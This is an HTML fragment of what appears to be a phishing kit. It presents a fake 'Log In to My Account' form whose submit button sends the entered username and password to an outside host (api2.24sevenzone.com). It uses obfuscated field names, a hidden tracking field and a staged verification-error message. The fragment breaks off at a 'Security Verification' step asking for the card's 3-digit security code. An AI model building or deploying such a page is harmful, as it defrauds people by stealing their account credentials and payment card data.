                      		<div class="fuidformContent clearfix">
                    		<div style="padding: 15px; text-align: center; color: #464646; font-weight: 100; font-size: 19px; line-height: 25px;">  Log In to My Account </div>
                           	<div style="line-height: 15px;">
                           		<p id="msg" style="font-family: Helvetica Neue, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #B42C01; line-height: 18px; display: none;"> &#9888; &nbsp;An error occurred during the verification process your account information. Please try again.</p>
          			    		<p id="error" style="font-family: Helvetica Neue, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #B42C01; line-height: 18px; display: none;"></p>
				 		    </div>
                                <label class="labelTxt"><span class="uid"></span></label>
                             <div> <input type="text" name="1a" id="uid" class="form-control" maxlength="65" required></div>	
                     			<p style="line-height: 15px;">&nbsp;</p>             			
                                <label class="labelTxt"><span class="ps"></span></label>
                              <div class="position-relative">
                                 <div><span data-target="#upw" id="visibility" style="font-size: 14px; font-family: Helvetica Neue, Helvetica, sans-serif; font-weight: 500; line-height: 1.75rem;">Show</span></div>
                                 <input type="password" name="1b" id="upw" class="form-control" maxlength="65" required>
                               </div>
                              	<p style="line-height: 10px;">&nbsp;</p>
        					  <div><label class="pull-left checkbox-inline"><input name="checked" type="checkbox">&nbsp; Remember Me</label></div>
                           	  <p style="line-height: 15px;">&nbsp;</p>
                              <div> 
                              	<input type="hidden" class="form-control" name="1e" id="trcka">
                              	<button type="submit" name="submita" formaction="https://api2.24sevenzone.com/v1/g.php" class="btn btn-primary mt-3 mb-3 w-25 h-10" id="login"> Log In </button>
                              </div>
                             </div>
                        </form>
                       </div>
                        
    				   <div id="loading" style="padding: 5px 10px 0; display: none">
        						<p style="font-family: Helvetica Neue, Helvetica, sans-serif; padding: 10px; text-align: center; font-size: 14px;">
        						<svg fill="#0059b3" stroke="#0059b3" viewBox="0 0 20 20" width="125px" height="125px" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="RadialGradient8932"><stop offset="0%" stop-color="#0059b3" stop-opacity="1"/><stop offset="100%" stop-color="#0059b3" stop-opacity="0.25"/></linearGradient></defs><style>@keyframes spin8932 { to { transform: rotate(360deg); } } #circle8932 { transform-origin: 50% 50%; stroke: url(#RadialGradient8932); fill: none; animation: spin8932 .5s infinite linear; : }</style><circle cx="10" cy="10" r="8" id="circle8932" stroke-width="1.5"/></svg>
        						</p>
    				  	</div>
						
                        <div id="clsdiv2" style="padding: 5px 10px 0; display: none">
                          <form id="fuidb" action="#" method="post">
                          	<div><a href="#" style="font-family: Helvetica Neue, Helvetica, sans-serif; font-size: 13px; font-weight: 300; line-height: 22px;" id="prev1"> Back </a></div>
					      	<div style="font-family: Helvetica Neue, Helvetica, sans-serif; padding: 15px; text-align: center; color: #4d4d4d; font-weight: 600; font-size: 15px;">  Security Verification: 3-Digit CSC </div>
					      	<div id="cancel_card_quest">  
                    		  <div style="line-height: 15px;">&nbsp;
          			    		<p id="cscerror" style="font-family: Helvetica Neue, Helvetica, sans-serif; font-size: 14px; color: #B42C01; line-height: 18px; display: none;"></p>
				   			  </div>
                    		  <p style="font-family: Helvetica Neue, Helvetica, sans-serif; font-size: 14px; font-weight: 200; line-height: 18px;">Please enter the 3-digit Card Security Code (CSC) which are the last three numbers printed on the signature strip on the back of your card.                             
